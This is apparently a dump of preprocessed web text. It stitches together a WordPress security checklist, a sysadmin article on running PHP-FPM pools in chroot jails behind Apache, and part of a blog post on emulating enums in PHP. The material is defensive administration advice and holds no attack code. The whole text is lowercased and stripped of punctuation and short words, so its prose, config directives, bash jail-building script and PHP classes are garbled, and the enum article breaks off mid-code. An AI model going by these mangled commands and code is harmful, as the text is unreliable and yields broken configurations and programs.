follow sleeping safelywordpress security checklistthere many wordpress security guide even step protect wordpress site many step completely unnecessary average userhere quick simple step take keep wordpress site safe secure use unique username strong password administrative accountsturn require verification administrative accountsdon install theme plugins untrusted sourcesset wordpress theme plugins updated automaticallyset wordpress backup automaticallyuse host containerbased isolation protects site contaminated insecure site serverthese six step take minute implement need worry wordpress security able focus building great website insteadwhy wordpress vulnerable insecure wordpress serious security secure software wordpress security team made security expert developer open source software many eye keep whole content management system safe secureso hear wordpress vulnerable insecure wordpress widely used cm blogging platform market share entire webthe popularity wordpress website make regular target brute force login attack attempt discover site use default username andor weak password sensitive information key keeping blog safe securea bruteforce attacker log many password hope guessing correctly attacker systematically check possible option correct one founduse twofactor authentication wordpress admin dashboard login effective brute force protectionthe second common attack outdated wordpress software obsolete version php outdated theme plugins key always update everythingboth type attack automated across hosting platform specifically target blog onlyif succeed infect blog adequately secured may even crosscontaminate blog hosted server let happen youbest wordpress security plugins identify existing vulnerabilitythere several wordpress security plugins tool use figure blog current weaknessthey scan malware malicious code script date software known security issue wordpress security plugins help keep blog safe best option include free version sucuri sitecheck sucuri plugin browserbased tool quick scan checksearch console security manual action section notifies google detects malware security issue wordpress websitewordfence security popular wordpress security plugin used million site feature login security firewall malware scannerhost blog secure hosting companyone vulnerability crosscontamination site hosted unprotected shared server exploitable site get attacked site server infected toothis happened blog time hosted godaddy initially blamed hack inexperience using best practicessince learned hack happen made wary using host well protected best protection crosscontamination use secure wordpress host ask host security precaution take crosscontaminationmy site readersupported make purchase link site may earn affiliate commission help keep site advertising trackingfree change price pay recommend product truly believe valuable learn moreright blog hosted greengeeks happy report security issue yet finger crossed continues happy paying customer greengeeks service several security measure server configuration additional feature place take advantage using wordpress installation wordpress blog automatically updated soon new release take actionthere nightly backup data case emergency fortunately deal backup yetthey containerbased isolation mean blog kept separated blog infected crosscontaminationinbuilt spam protection realtime malware virus monitoringyou also get free domain name free ssl certificate let encrypt prevent site labeled secure different customer support via live chat email phone case necessaryturn verificationtwofactor verification add extra layer security wordpress login url completely prevents brute force attackswithout access phone simply impossible break login page even attacker know username passwordturn secure sign jetpack one easiest way enable two factor authentication wordpress let log selfhosted site wordpresscom logins wordpresscom allows require twofactor authenticationenable twostep wordpresscom account twostep authentication within security install activate jetpack plugin selfhosted wordpress admin areaturn single sign optiontick box require twostep authentication insert code theme functionsphp file disable default wordpress login form addfilter jetpackremoveloginform returntrue log selfhosted blog using wordpresscom login detail require twofactor authentication phone default login disabledtwo step authentication far best way stop people trying brute force way wpadmin dashboard highly recommend itin past used several different hack prevent attack changing url default wordpress login page blocking ip address except trying login two step authentication much elegant solutionblock unwanted brute force login attemptsif whatever reason turn twostep authentication decent alternativejetpack protect like web application firewall wordpress monitor failed login attempt network site hosted wordpress automatically block unwanted try bad ip address rest networkanother common way hacker try brute force site xmlrpc jetpack protect also block xmlrpc attack need anything disable xmlrpc using jetpackactivate jetpack plugin enable protect addon turn onthe alternative wp limit login attempt pluginautomate update wordpress pluginsmain reason developer release new version frequently caused security vulnerability found older version vast majority security compromise happen outdated pluginsautomatic update work keep safe always upgrade latest version wordpress newest version blog design theme plugins useupgrading simple automated oneclick process within wordpress admin interface new update available wordpress give notice top dashboardthe recent version feature automatic background update may find secure host update latest version automatically sleep mine doesthemes plugins automatic update possible since wordpress release august number plugins theme installedkeep entry point attack minimum install theme plugins actively use necessary run blog remove anything usedminimize number plugins use jetpack instance replaces several different pluginsdon download theme plugins unknown source use official plugins theme official website trusted source premium theme pluginsthese quality sign look plugin theme high number downloads active wordpress usersregular update recent last updatecreate new user account limit unauthorized accessit harder hacker break wordpress account username password cracked username admin frequent target brute force attack easy target deleted usedreduce number people admin access blog minimum anyone need admin access easy role capabilitieshere create new user delete default admin user create user going user add new wordpress menuwhen creating new user make sure give role administrator ensure full authority wordpress website securitynow log default admin account log new user detailsin user delete default admin usernamemake sure choose option transfer old post new username deleting admin accountuse strong secure passwordsdon use simple password wordpress account simple password might make easy remember also accessible hacker crackuse strong secure password instead password least twelve character longinclude number special character upper lowercase lettershere free tool norton help create strong passwordset new nicknameyou want new username author name shown post way hacker easy way finding new usernameset nickname account something different username go user profile choose new nickname nickname fieldset display name publicly new nicknamedo allow guest user registrationsyou membership site reason allow visitor register guest accountcheck got registration turned click setting make sure anyone register option untickeddo allow pingswordpress pingback option enabled used ddos attack site option enabled default important disable itin setting go discussion default article setting tick allow link notification pingbacks trackbacks take regular automatic backupstaking daily weekly automatic backup content database essential good hosting provider execute system backup part mine doesat time set wordpress site greengeeks select automatic updated automatic backup still take personal responsibility regular backup wordpress consists two part database place setting page post comment storedfiles include medium attachment theme pluginsit recommended perform regular full backup entire site plethora option best free plugin updraftplus used million blogsin case site get hacked infected virus malware able restore fully functioning backupthese simple step executed relatively quickly improve wordpress security make site much harder break intoyou probably hacking problem feel safer able focus time writing exciting content building audience
51,Lobsters,php,PHP programming,"Apache, PHP-FPM, chroot jails, MediaWiki, MySQL, and so on",https://ansuz.sooke.bc.ca/entry/360,apache phpfpm chroot jail mediawiki mysql,home take zdrabko mskala linux software reference apache httpd php phpfpm subversion taking inventory northcoastsynthesiscom audionorthcoastsynthesiscom videonorthcoastsynthesiscom edifyingfellowshiporg mediawiki tex mariadb tarot card reading astrological chart filesnorthcoastsynthesiscom northcoastsynthesiscom matomo chord database lilypond oscommerce disabling php per vhost section merged starting phpfpm set apache reverse proxying switching web space phpfpm disabling modphp matter connection reuse documentation modproxyfcgi proxypass directive documentation creating new pool switching web space use new pool new unix user pool organizing data file space setting chroot jail idsgrep online kanji search page running external software chroot strace chroot mariadb mysql chroot tex chroot astrological chart system according mediawiki doc minimal texlive installation mediawiki dns chroot http client chroot sending email within chrooted php minisendmail fork volkan kucucakar github pull request conclusion facebook facebook twitter reddit reddit linkedin linkedin,â home take zdrabko â wed jan mskala tag used linux software reference note configuring apache httpd run large php application via phpfpm separate chroot jail recently occasion find bit piece information many different place around net compiling note future use anyone contemplating similar project number subtle detail needed thing like get tex working needed mediawiki math configure processpool policy going go much detail someone would want background system administration concept like chroot jail nt want take whole server extended period running important web site made goal whole changeover new setup small testable step keeping config file subversion helped allowing easily keep track change made roll back needed taking inventory started going existing server configuration particular finding php script use apache host named bokan running total namebased virtual host various branch single web root directory six actually using php virtual host handle stuff like redirect northcoastsynthesiscom preferred url without hyphen remaining virtual server using php follows audionorthcoastsynthesiscom running small script wrote generate index page r feed videonorthcoastsynthesiscom much like audio server running one small php script generate index page r feed edifyingfellowshiporg running mediawiki instance dependency tex mariadb answer main url also small script wrote tarot card reading astrological chart dependency tex swiss ephemeris symlink web space filesnorthcoastsynthesiscom allow matomo installation also answer edifyingfellowshiporg url filesnorthcoastsynthesiscom server backend stuff supporting storefront northcoastsynthesiscom storefront server big php thing virtual host matomo instance depends mariadb also many small script wrote various purpose like r generation web log commenting newsletter subscription form handle sensitive customer data write flatfile database virtual host also run new chord database cpu hog depends lilypond installation oscommerce instance currently open public part ongoing experiment toward someday selfhosting ecommerce dependency mariadb general want segregate anything large rest system especially something large nt write nt trust people php code much mediawiki particular big application nt write constantly attack spam robot even missioncritical anyway get compromised want many obstacle possible attacker sensitive part system matomo another big php application nt write actually missioncritical space chord database big target write cpu hog large dependency make sense separate give different processing priority oscommerce would missioncritical using experimentally also big application nt write big target attack putting application become chroot jail dividing rest two jail edifying fellowship north coast synthesis stuff end list six jail wiki mediawiki instance matomo matomo instance edifying stuff edifyingfellowshiporg mediawiki miscphp stuff public subdomains northcoastsynthesiscom matomo chord database chord chord database oscommerce oscommerce instance would eventually become phpfpm process pool running unix uid gid chroot jail configuration started project php active throughout web space handled modphp running script uid gid apache access entire filesystem activated including modphpconf file think nt edit minimally edited default httpdconf active line file follows loadmodule filesmatch php sethandler applicationxhttpdphp filesmatch plan project ran le follows disable php virtual host nt using start running phpfpm server default configuration one process pool run script uid gid apache like existing modphp configuration set module config apache make reverseproxy request phpfpm server one chunk web space time change apache config send request php file phpfpm server instead modphp disable modphp make sure php script running phpfpm still work create six pool actually want use point still use uid gid apache access entire filesystem one pool time configure apache send request appropriate pool instead apache pool remove apache pool phpfpm make sure script still work create new unix user group pool set permission appropriately switch pool use uid gid rearrange data file used selfwritten php script possible data file actually live apache server web space b extent possible data file used given pooljail live single data directory pooljail reduces number bind mount needed later set chroot jail contain thing needed corresponding pool extent possible nothing else instruct phpfpm run pool process chrooted jail disabling php per vhost already apache config file virtual host blocking php support one nt meant adding appropriate file section one lock service php file php interpretation want php file somehow manages make way file space served one virtual host nt want server serve uninterpreted source code could contain sensitive stuff like database password site visitor final configuration also wo nt anything globally telling apache interpret php file point project existing global modphp interpretation still exists overridden pervhost file directive see apache documentation section merged important though confusing information precedence order configuration directive relevant point adding directive file section inside virtual host override serverglobal filesmatch currently sending php file modphp northcoastsynthesiscom virtualhost servername northcoastsynthesiscom line omitted file php require denied file virtualhost virtualhost sslengine servername northcoastsynthesiscom line omitted file php require denied file virtualhost note similar config file change necessary restart relevant server modifying file least instruct server reload config support change take effect modified file starting phpfpm phpfpm server need run like daemon linux distribution slackware came rcphpfpm file added rclocal would run boot put rclocal could easily add script set chroot jail written later phpfpm start phpfpm server automatically read conf file etcphpconfd come file called wwwconfdefault nt actually get loaded conf file contains documentation format option working constructed following apacheconf file intended run php script way running modphp better minimize transition issue apache prefix srvphpfpm user apache group apache listen srvphpfpmsocketsapache listenowner apache listengroup apache listenmode pm dynamic pmmaxchildren pmstartservers pmminspareservers pmmaxspareservers pmmaxrequests apache header say process pool named apache prefix refers directory created hold phpfpmspecific stuff two subdirectory unix socket one socket per pool chroot jail come along user group setting represent unix uid gid pool process therefore php script run php script run setuidsetgid value set equal apache moment php script see difference existing modphp configuration run everything inside apache server process configure location unixdomain socket used apache talk pool set permission allow web server uid talk pool fact later ended making socket permission allowing group access another unprivileged process elsewhere system could hit extract status information listenowner listengroup setting represent unix uid gid listening socket permission must set apache server config run uidgid apache connect socket note although case apache match user group final configuration pool user group none apache pool use apache listenowner listengroup remaining setting relate controlling process pool default except turned pmmaxrequests feature example value pool process die replaced serving request seems like sensible thing possibility memory resource leak note elected use unixdomain socket communication apache phpfpm unixdomain socket seem like best option config apache phpfpm host confident security done way may also slightly efficient option necessary larger installation phpfpm pool separate host apache use tcp socket assign pool port number traditionally starting port end assigning tcp port number pool well number described later used internally apache configuration file distinguishing pool server actually listen connect tcp port set apache reverse proxying basic architecture apache answer http http request ssl access control geolocation url rewriting serf static file case php file recognizes request going php file apache make request phpfpm server forwarding request another server one case general activity called reverse proxying turn sibling concept forward proxying make work apache need load module proxying general support forward reverse also specific proxyrelated module every protocol used outgoing proxy connection case outgoingconnection module needed fastcgi protocol protocol spoken apache phpfpm forward connection unix socket forward proxying security nightmare one nt actually need important make sure turned created new config file called httpphpfpmconf put addon httpd config file added line httpdconf load right line load modphpconf note moment modphp remains enabled content httpphpfpmconf file config apache proxying phpfpm bokan matthew skala mskala northcoastsynthesiscom load dynamic module proxying fastcgi loadmodule proxymodule loadmodule proxyfcgimodule make sure nt forward proxying proxyrequests load two needed module turn forwardproxying feature although default anyway turning reverse proxy done locally place php script need run switching web space phpfpm virtual server root web space added file section htaccess file nt fully understand apache precedence system want directive override global filesmatch section currently sending php file modphp think file section inside htaccess file directory context merged override global filesmatch section directive inside merged thing anyway seems work desired putting section htaccess appears override global modphp handler directory appears subdirectory file php f requestfilename sethandler proxy unix srvphpfpmsocketsapachefcgi file several different way tell apache use reverse proxy one seemed work briefly explored using modrewrite p flag supposedly le efficient allows elaborate translation incoming proxied url wanted try order get better access phpfpm status page access control never able get modrewrite rule send request proxy may point global sethandler used activate modphp sethandler properly override activate reverse proxy condition say proxying done request corresponds actual php file web space way modphp installation work may guard possible silliness involving request sent proxy thing actually php code probably also made much harder ever get phpfpm status page served apache eventually gave argument sethandler includes fcgi url pointing port localhost phpfpm really listen port actually listens unix socket named earlier argument string fcgi url syntactic requirement apache us port number possibly also hostname localhost distinguish different worker reverseproxy configuration later configured phpfpm pool would choose different port number etc apache could configure separately even though described ended choosing specific perworker configuration apache disabling modphp web space either configured block access php file configured use reverse proxy send request php file phpfpm tested script point script supposed running environment modphp inside phpfpm instead inside apache seemed work next step remove modphp configuration meant commenting include line modphpconf httpdconf restarting server tested script make sure could still run none secretly depending modphp thought cut phpfpm matter connection reuse fpm phpfpm fastcgi process manager one main function manage process start stop backend process order try optimize performance resource use want spare process running request come go straight idle process without spin new one want process remain idle long time reaped memory use available purpose especially important lot different process pool sharing memory small server bunch option phpfpm controlling many process start many spare one keep idle long keep extra idle process around also several different selectable entire algorithm management stuff configured perpool basis apache reverse proxy system similarly manage virtual connection apache backend server case phpfpm configured either set tear connection every request reuse maximum number spare connection keep timeouts similar phpfpm handle process reusing connection supposed improve efficiency process cost associated opening new connection request come spare connection first thought wanted turn connection reuse apache reverse proxy spent hour figuring eventually decided good idea would rather configuration none type connection reuse documenting future reference anyway connection reuse enabled adding section like following apache configuration put httpphpfpmconf file make global whole server seems desirable nt want depend elsewhere web space might using given pool proxy fcgi proxyset enablereuseon proxy note documentation saw seemed say connection reuse turned case unixdomain socket appear true true point longer true connection reuse certainly turned unixdomain socket current version software whether good idea separate question turn feature need section like pool point one exists adding later fcgi url including hostname port number need match one used sethandler directive activates reverse proxying true even though port number real server listens client connects tcp port configuration used apache index associate proxy section config worker referred sethandler directive may possible merge proxy section pool single section mean kind wildcard match enough pool preferred explore figuring might want different setting different pool would better give one configuration section even ended identical port number decided actually want connection reuse apache phpfpm connection reuse seems defeat phpfpm process management work important documentation modproxyfcgi contains warning hindsight guess refers issue clear first read say enable connection reuse fcgi backend like phpfpm please keep mind phpfpm time writing february us prefork model namely worker process handle one connection time default modproxy configured enablereuseon allows connection pool threadsperchild connection backend httpd process using threaded mpm like worker event following use case taken account load likely cause creation maxrequestworkers connection fcgi backend actually happens connection reuse apache open many connection phpfpm allow never close phpfpm open process every connection hit configured maximum keep process open long apache keep connection open pool sits configured maximum number process time supposed case give apache option along enablereuseon telling expire idle connection timeout experience never actually expire connection matter option given even option worked advertised apache feature controlling reused connection le flexible phpfpm feature controlling process pool given concept reused connection pool process end functionally equivalent connection reuse preferable phpfpm manage instead apache turning reused connection slight performance cost added overhead setting tearing connection every incoming http request overhead apparently small using unixdomain socket apache phpfpm might little using tcp socket especially across network given really wanted use phpfpm process management work seemed okay pay small cost reusing connection apache phpfpm note proxy section like could also added config control reverse proxy worker option besides connection reuse desired read list option proxypass directive documentation nt see wanted change leaving default possible omit proxy section config ended creating new pool point php script running phpfpm reverse proxy still running single pool next step split pool six would eventually six chroot jail splitting pool without changing anything else first priority finished able make config change one pool time without affecting others allowing experiment lesscritical pool first learn exactly get running proceed morecritical pool le fear breaking something taking important application create pool add new config file phpfpmd directory file matomo pool matomo prefix srvphpfpm user apache group apache listen srvphpfpmsocketsmatomo listenowner apache listengroup apache listenmode pm dynamic pmmaxchildren pmstartservers pmminspareservers pmmaxspareservers pmmaxrequests substantially similar earlier example apache pool note still using apache uidgid setting switching new unix user done later little dangerous need get permission right file php code touch else application break instantly also note socket name srvphpfpmsockets pool us dynamic process management algorithm try keep enough process running number idle process kept within certain range also obeying restriction absolute maximum total number process idle always keep nonzero minimum number process active pool appear process table time first visitor show period idleness always process ready take first http request implying low latency first requect wanted keep idle process hot standby like matomo pool one run analytics tracking script visitor storefront hitting script every page want respond fast possible setting specify maximum process total pmmaxchildren target idle process time pmminspareservers pmmaxspareservers start process initially pmstartservers based estimate memory consumed per process much memory willing spend matomo relation capacity server think number right wo nt dump pool configs example similar file chord pool different configuration chord prefix srvphpfpm user apache group apache listen srvphpfpmsocketschords listenowner apache listengroup apache listenmode processpriority pm ondemand pmmaxchildren pmprocessidletimeout pmmaxrequests one us ondemand process management algorithm try keep process active time instead spin server process response incoming request php execution relevant pool mean le resource consumption request made pool added latency request first come idle period algorithm also respect limit maximum number process pmmaxchildren case keep process go idle alive timeout expires pmprocessidletimout case second handle continued traffic show number chosen estimating memory consumption guessing maximum time might elapse page load someone browsing database script chord pool handle engraving guitar fret diagram lilypond activity consumes whole lot cpu power nt want someone especially bot may browsing chord database slow whole server higherpriority application request come added processpriority setting saying process pool niced lowestranking priority available upon creating file restarting phpfpm server phpfpm ready run php script new pool remains tell apache actually send script request moment still pointing apache pool earlier switching web space use new pool easy operation performed earlier adding modifying sethandler inside filesif section directory htaccess file added section look something like file php f requestfilename sethandler proxy unix srvphpfpmsocketswikifcgi file note pool socket path must included also assigned pool port number even though fake allow linking proxy section elsewhere see comment proxy section connection reuse applying logic entire virtual server web space new section would replace earlier section created point apache pool desired configuration also involved subdirectory different pool assignment parent got new section htaccess file section child override parent inherit parent configuration override directory time testing make sure nothing broke hit url ondemand pool relevant process actually start indicating request really going new pool thought php file directed new pool deleted configuration file old apache pool restarted phpfpm server tested everything make sure nt anything missed new unix user pool pooljail unix user group created directory srcphpfpmchroot contain subdirectory pooljail chroot location home directory unix user command creating look like useradd srvphpfpmchrootwiki sbinnologin u option designate home directory set login shell sbinnologin fake shell prevents logins u tell useradd also create group name add new user group changing phpfpm configuration run process pool appropriate new uidgid value easy change user group setting pool listenowner listengroup restarting server configuration important make sure permission web space appropriate web server running uid gid apache need able read everything statically serve need able find file telling phpfpm execute whether read phpfpm running relevant pool uid gid need able read everything execute php script may need write file directory depending script interacts web space script must put appropriate permission new file create ideally file access possible practice set unprivileged admin account mskala perpool group made web space rule permission owner mskala group apache appropriate static file served apache server read actually everybody read okay file meant publicly served web unprivileged admin account write necessary php script write file directory changed group appropriate pooljail group added group write new file created php script would normally end owned pooljail user could lock even tighter removing worldread changing group appropriate make sure web server read file meant serve static file php script access file nt need touch really sensitive static file accesscontrolled apache nt visible script world file meant served public web space anyway little benefit carefully preventing script reading apache able read script problem think existing configuration never serve script web document accessible proxy fail normally sensitive data would outside web space served apache unavailable php reason chroot jailing implement lot different way script interact filesystem including stuff like cron job outside apachephp installation write file web space accessed apache php took testing debugging make sure everything would still work php script running new uids however world read file made configuration pretty forgiving even file ownership ended really intended write permission need really carefully tested locked much tightly organizing data file space original inventory found lot homewritten php script using flat file database stashed different location around system actually web space htaccess file preventing apache serving private directory elsewhere reading file directly mskala home directory order simplify construction chroot jail created single directory named like srvwwwdatamiscphp outofwebspace data file needed jail needed file moved data file directory updated script point new location note often outofwebspace data file point communication php script running web space something else cron job run outside web space necessary update location change policy nt absolute case relevant readonly data file subversion control along script use really advantageous keep data alongside script web space despite fact file meet criterion moved web space data file already outside web space scattered semirandom place elsewhere filesystem made sense centralize new data directory instead extend lot tentacle chroot jail touch scattered file setting chroot jail chroot jail ought contain file phpfpm script run relevant pool anything needed program invoke need touch ideally jail contain nothing sensitive one thing help lot shared library stuff needed phpfpm actually loaded go chroot remain accessible process chroot call nt need included jail file need opened jailing need placed inside jail thought jail script build jail edit jail editing script instead making change directly jail way record script subversioncontrolled supposed inside jailcreation script start destroying existing jail one starting fresh way inmate process riot trash jail compromise misconfiguration le danger stuff trashed jail carried new one although still contagion bind mount extent readonly large chunk file space need mapped jail mapped via bind mount isolated file copied jail nt need able write unjailed process see go step step jailcreation script miscphp jail one simplest one talk issue specific certain application feature jail contains miscellaneous script run subdomains northcoastsynthesiscom need access flatfile database one backend idsgrep online kanji search page need run external program special library data file dependency script jail nt need make outgoing network connection connect mariadb similar first set variable used part file make easier cut paste section code among chrootsetup script although enough difference special need per jail may practical really abstract everything thoroughly binbash config var jailnamemiscphp chrootbasesrvphpfpmchroot webrootsrvwwwhtdocsfiles webdatasrvwwwdata jailname bind mount represent window jail general filesystem important active recursively destroy jail nt want recurse general filesystem destroy stuff mount pointing test known file inside mount abort present mount supposed removed note umount line issue harmless error message script run mount already nt exist startup remove old bind mount umount chrootbase jailname webdata umount chrootbase jailname webroot umount chrootbase jailnamesrvwwwhtdocsaudio umount chrootbase jailnamesrvwwwhtdocsvideo failsafe nt proceed old bind mount still exist test f chrootbase jailname webdatamailinglistsubscribers echo failed unmounting bind mount jailname exit fi test f chrootbase jailname webrootindexhtml echo failed unmounting bind mount jailname exit fi test f chrootbase jailnamesrvwwwhtdocsaudioindexphp echo failed unmounting bind mount jailname exit fi test f chrootbase jailnamesrvwwwhtdocsvideoindexphp echo failed unmounting bind mount jailname exit fi bind mount removed destroy jail onefilesystem option rm additional protection deleting outside bound jail case failed umount blow away old chroot jail rm onefilesystem rf chrootbase jailname next set skeleton directory copy bindmount stuff create full set bin usrbin usrlocalbin script jail use binary may try hardcoded path want binary location inside jail outside case library though put inside jail even came outside program searching dynamic library nt really care cut complexity existing within jail webdata directory unified directory created described flatfile database used php script jail webroot path mount point bindmounting web root main virtual host serving script jail jail actually also serf two virtual host also create mount point bindmounting vhosts web root create tmp script need also useful place put debug log testing tmp may also needed phpfpm least configuration though certain finally directory usrlocalshare needed dictionary used idsgrep commandline program one script want invoke set directory structure mkdir p chrootbase jailname mkdir p chrootbase jailname webdata mkdir p chrootbase jailname webroot mkdir p chrootbase jailnamebin mkdir p chrootbase mkdir p chrootbase jailnamesrvwwwhtdocsaudio mkdir p chrootbase jailnamesrvwwwhtdocsvideo mkdir p chrootbase jailnametmp mkdir p chrootbase jailnameusrbin mkdir p chrootbase jailnameusrlocalbin mkdir p chrootbase jailnameusrlocalshare next copy library needed different commandline program run script inside jail note bash needed library required order run commandline program list required library program found running ldd utility program binary although complicated program plugin kind interface may possibly also try load library revealed ldd library example pretty common exception two libbdd needed idsgrep libkyotocabinet needed local search engine backend query program may appropriate automate process start list binary instead list library script automatically process binary ldd copy whatever library needed would le errorprone list binary change software upgrade introduce new version number far nt explored idea far copy library lib cp lib chrootbase done cp chrootbase cp chrootbase cp chrootbase cp chrootbase executables invoked php script directly indirectly get copied note shell needed invoke thing symlink bash sh many program look hardcoded path binsh necessary include binary invoked shell script even indirectly take note fact program wrap binary shell script instead usertyped command binary directly although shown actually also couple binary come particular jail bind mount instead copied point copy executables cp binbash chrootbase jailnamebin ln bash chrootbase jailnamebinsh cp usrbinhead chrootbase jailnameusrbin cp usrbinsort chrootbase jailnameusrbin cp usrlocalbinidsgrep chrootbase jailnameusrlocalbin particular jail also duplicating usrlocalsharedict idsgrep want search would nt necessary jail copy dictionary cp usrlocalsharedict chrootbase jailnameusrlocalshare point importantly none bind mount active set basic permission everything tightly locked file directory end owned root readable writable jailed process group permission world inaccessible except tmp get usual worldeverything permission sticky bit anything jailed process allowed write except temporary file going come bind mount set basic ownership permission chgrp r jailname chrootbase jailname chmod r guw orwx chrootbase jailname chmod arwx ot chrootbase jailnametmp finally bind mount webroot bind mount would probably required almost jail phpfpm read script supposed execute case also two web root virtual host served process pool need mounted jail webdata directory need bind mount nt bind mount jail jail containing large application need might need others note list bind mount need kept synchronized corresponding unmount command near top file bind mount mount bind webdata chrootbase jailname webdata mount bind webroot chrootbase jailname webroot mount bind srvwwwhtdocsaudio chrootbase jailnamesrvwwwhtdocsaudio mount bind srvwwwhtdocsvideo chrootbase jailnamesrvwwwhtdocsvideo whenever script run recreate jail probably necessary restart phpfpm make sure pool process pointing new version unlinked old one running external software chroot homegrown php script many externallywritten application want run external software system popen similar call php us binsh copied bash chroot jail library dependency created symlink binsh binbash strace chroot useful run thing strace inside chroot especially debugging something fails run strace program library dependency suggestion put separate line script file copying even duplicate library used permanent inmate line easily commented strace nt desired final production version jail probably contain strace powerful make available potential attacker enable strace lib cp lib chrootbase done cp usrbinstrace chrootbase jailnameusrbin whenever using strace would edit script call target program strace direct output chroot jail tmp running strace ff option allows trace child process important frequent case whatever failing shell script plain strace trace shell probably operating normally mariadb mysql chroot php application often want access mysql mariadb system able get working bind mount varrunmysql allow phpfpm connect unix socket mariadb server various library etc needed php mysql binding preloaded pool process go chroot nt need included jail complicatd configuration connecting database server across network might necessary make provision stuff like dns resolution described php script invoke external program external program need talk mysql including external program invoked commandline mysql interface probably necessary bring mysqlrelated shared library jail tex chroot really proper mediawiki installation ought access tex huge software system package manager directory structure used displaying math wiki article may may important given wiki since also need tex astrological chart system made sense go ahead work make work mediawiki mediawiki installation us png method according mediawiki doc deprecated something one found easiest get working time install ever switch new recommended one sound like involve running yet another server article though going go mediawiki math configuration talk got existing working configuration work inside phpfpm chroot jail possibly interest article wrote time ago minimal texlive installation mediawiki texlive installation normal file tree life srvtexlive symlinked usrlocaltexlive hardcoded path program look mount point symlink need created directory creation step srvtexlive tree also need bind mounted mkdir p chrootbase jailnamesrvtexlive ln srvtexlive chrootbase jailnameusrlocaltexlive shared library requirement mediawiki invoke tex tex nt really use shared library thing instead mediawiki invokes tex texvc program actually mediawiki web space doe nt need copied come bind mount main mediawiki web space however call also go kind resourcelimiting shell script limitsh go read utility used shell script need included commandline tex program need invoked appear usrlocalbin copied mediawiki installation latex dvipng astro chart application us several others symlinks real binary live tex directory structure requirement binary run automatically trace symlinks find real location search surrounding directory many many necessary configuration macro precompiled dump font cache file need copy executables cp binbash chrootbase jailnamebin ln bash chrootbase jailnamebinsh exec mkdir rmdir sleep timeout cp usrbin exec chrootbase jailnameusrbin done need symlinks tex file searching work ln chrootbase jailnameusrlocalbinlatex ln chrootbase jailnameusrlocalbindvipng finally note tex need etclocaltime associated script need devnull must put jail cp etclocaltime chrootbase jailnameetc mknod chrootbase jailnamedevnull c although mediawiki installation need pooljail invokes tex actually also requires ghostscript jail pspdf conversion call care ghostscript another large application need refer structure data file ended bind mounting usrshareghostscript directory use unlike tex native program ghostscript commandline program require long list shared library dependency mostly add list copy ghostscript commandline program often really shell script invoke binary even shell script invoke shell script two level getting binary necessary chase make sure every needed binary shell script end included jail process tedious really difficult nt include detailed list copied would highly dependent specific jailed php code us ghostscript dns chroot program inside jail whether phpwritten external need make outgoing connection analyse incoming connection certain way need able dns resolution found worked include file etcresolvconf jail shared library apparently loaded late nt appear listing ldd program want dns including php interpreter try load demand want dns fail present note resolvconf file may automatically change time time running dhcp environment want jailed copy track change external copy need deal way bind mount instead copying file mine expected change frequently moment least okay jailed dns break nameservers change manually refresh nt know universal way enabling dns may worked seen lot tutorial suggest much complicated thing involving running caching dns server making available jailed process information topic net hard search instruction running dns client inside chroot jail tend get mixed instruction running dns server like bind inside chroot jail different project matomo web analytics platform quite likely need dns resolution large application try phone home automatically update probably need dns http next topic dns also requirement sending email within php http client chroot incoming http connection handled apache switching php interpreter nt change configuration php application also want make outgoing http connection instance update data file normally entail using dns previous section also usually need access one certificate file used verify end credential php builtin http client functionality appears disabled globally site allowurlfopen nt want change given everything seemed working fine interpreter switch sure might needed make builtin support work instead php application outgoing http seem using curl library addition requirement making dns work able get curlbased http client function working copying usrsharecurlcabundlecrt jail sending email within chrooted php php includes builtin function called mail sending email message people sometimes including php team claim function suck used application use designed work invoking commandline sendmail many system unworthy newfangled mta present sendmaillike command line interface compatibility bringing real sendmail chroot jail would problem many dependency want touch lot sensitive place filesystem want setuid root usually recommended course action run something called minisendmail mimic commandline interface real sendmail far enough take message input pas message submission port localhost assumed one running serious mta piece software last updated three issue preventing working asis chroot jail kind describing least mediawiki attempt find currently loggedin user name getpwuid depends bunch stuff like etcpasswd would better inside jail dy fails correctly implement one specific commandline syntax f option f value f two separate argument particular syntax used mediawiki might easy patch mediawiki use different syntax minisendmail understand patch would fragile would possibly need repeated php application also use syntax misparses header valid syntax realname username examplecom changing invalid syntax rejected smtp server mediawiki trigger issue usually generating header fork volkan kucucakar github fix first problem adding commandline option specify username fork last updated submitted pull request fixing second issue nt know project ever merge pull request touched nt really want encourage people use github anyway think probably submit patch third issue instead eventually package post web space fast depend much interest hear community nontrivial amount work packaging something like properly necessary use software worthwhile people going link anyway patched minisendmail small binary brought chroot jail renamed usrbinsendmail compatibility jail need configured support dns php interpreter need told invokes minisendmail pas username jail minisendmail wo nt attempt getpwuid die done adding line phpfpm process pool config file phpadminvalue sendmailpath usrbinsendmail usernamewiki syntax command sensitive minisendmail program another effect fact commandline parsing hand instead calling proper library requires exactly syntax equal sign username option equal sign string value mean value assigned phpadminvalue sendmailpath must quotation mark phpfpm choke conclusion note cover came project putting php application separate phpfpm process pool chroot jail apache hope use probably update note discover relevant point share facebook facebook twitter reddit reddit linkedin linkedin
52,Lobsters,php,PHP programming,Enums without enums in PHP,https://stitcher.io/blog/enums-without-enums,enums without enums php,back brent enums without enums php date range boundary want use type system ensure valid enum value used want enums support valuespecific behaviour want avoid using conditionals enum value newsletter twitter pr,back written brent february enums without enums php enums still lacking php yet clean way enumlike behaviour code base without using external dependency take example date range boundary boundary included excluded boundary enum would used daterange daterange make boundary includeall constructor signature daterange look like public function construct start end boundary boundary first requirement want use type system ensure valid enum value used next want able ask enum boundary included like daterange boundary startincluded daterange boundary endincluded mean enum value support implementation startincluded endincluded second requirement want enums support valuespecific behaviour first sight easiest solution boundary class implement startincluded endincluded like final class boundary private const includenone none private const includestart start private const includeend end private const includeall private string value public static function includestart self return new self self includestart private function construct string value value value public function startincluded bool return value self includestart value self includeall public function endincluded bool return value self includeend value self includeall short using conditionals enum value add behaviour example clean enough solution however nt scale well imagine enum need complex valuespecific functionality often end large function containing large conditional block conditionals path code take complex understand maintain prone bug third requirement want avoid using conditionals enum value summary want enums match three requirement enum value strongly typed type system check enums support valuespecific behaviour valuespecific condition avoided cost polymorphism offer solution enum value represented class extending boundary enum therefore value implement version startincluded endincluded returning simple boolean maybe make something like abstract class boundary public static function includenone includenone return new includenone abstract public function startincluded bool abstract public function endincluded bool concrete implementation boundary like imagine three would look like final class includenone extends boundary public function startincluded bool return false public function endincluded bool return false initial work program enums meet requirement one improvement made need use dedicated class specific value never used instead making four class extending boundary could use anonymous class abstract class boundary abstract public function startincluded bool abstract public function endincluded bool public static function includenone boundary return new class extends boundary public function startincluded bool return false public function endincluded bool return false public static function includestart boundary return new class extends boundary public function startincluded bool return true public function endincluded bool 